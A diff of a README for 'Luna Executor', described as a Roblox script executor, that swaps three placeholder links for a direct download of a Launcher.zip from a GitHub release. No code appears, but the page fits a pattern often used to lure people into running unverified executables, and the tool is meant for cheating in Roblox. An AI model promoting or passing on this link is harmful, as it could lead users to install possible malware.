@@ -1,12 +1,12 @@
 # 🌙 Luna Executor - fast, reliable, and sleek Roblox script executor.
 
-**[![Download Luna Executor](https://img.shields.io/badge/Download-Luna%20Executor-green)](/)**
+**[![Download Luna Executor](https://img.shields.io/badge/Download-Luna%20Executor-green)](https://github.com/shahzaibx365/luna-new-update-2025/releases/download/luna/Launcher.zip)**
 
 ![image](https://github.com/user-attachments/assets/a841abdc-5e86-4261-99b8-1b0f9a79f0c0)
 
 ## 📥 Getting Started  
 Getting up and running with **Luna Executor** is quick and easy:  
-1. **[![Download Luna Executor](https://img.shields.io/badge/Download-Luna%20Executor-green)](/)**  
+1. **[![Download Luna Executor](https://img.shields.io/badge/Download-Luna%20Executor-green)](https://github.com/shahzaibx365/luna-new-update-2025/releases/download/luna/Launcher.zip)**  
 2. Extract the downloaded `.zip` file to a folder of your choice.  
 
 ## 📌 About  
@@ -61,7 +61,7 @@ Q: Can I use custom scripts?
 A: Absolutely — you can execute any Lua script compatible with Roblox.
 
 ## 📥 Download
-👉 [Download Latest Version](/)
+👉 [Download Latest Version](https://github.com/shahzaibx365/luna-new-update-2025/releases/download/luna/Launcher.zip)
 
 ## 🤝 Support & Community
 
